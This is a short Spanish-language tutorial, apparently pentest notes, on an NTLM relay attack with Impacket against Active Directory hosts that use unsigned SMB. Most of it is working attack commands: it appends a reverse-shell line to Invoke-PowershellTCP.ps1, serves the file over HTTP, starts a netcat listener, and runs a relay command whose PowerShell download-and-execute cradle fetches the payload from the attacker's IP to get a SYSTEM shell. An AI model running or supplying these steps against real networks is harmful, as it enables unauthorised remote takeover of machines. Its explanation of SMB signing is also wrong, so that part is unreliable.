Cuando encontramos equipos que hacen uso de SMB y sobre todo de conexiones a servicios SMB no firmados, es decir, que no piden autenticación por parte del servidor que entrega el recurso. 
Podemos realizar un ataque con NTML-Relay de Impacket. Con esta herramienta le indicaremos que ofrezca a los equipos de un entorno de Active Directory que intentan acceder a algún recurso que no existe, una dirección alternativa dentro del rango de red. 

En este ataque, al fichero que serán redirigidos estos equipos será un fichero Invoke-PowershellTCP.ps1 modificado para que una vez cargado en el sistema cree una reverse shell a nuestro equipo.

Debemos tener un fichero targets.txt donde estarán las direcciones de los equipos de la red.

Ataque:
>Copiamos y modificamos el fichero Invoke-PowershellTCP.ps1, para añadir una última línea
>`Invoke-PowershellTCP -Reverse -IPAddress <own_ip> -Port 443`
>Nos compartimos un servidor con python donde se ofrezca este fichero Invoke-PowershellTCP.ps1
>`python -m SimpleHTTPServer 80`
>Abrimos una sesión con netcat en espera de la reverse shell
>`rlwrap nc -nlvp 443`
>Ejecutamos el NTML-Relay
>`impacket-ntmlrelay -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://<own_ip>/Invoke-PowershellTCP.ps1')"`

En la sesión con netcat, recibiremos la reverse shell como el usuario administrador nt-authority system.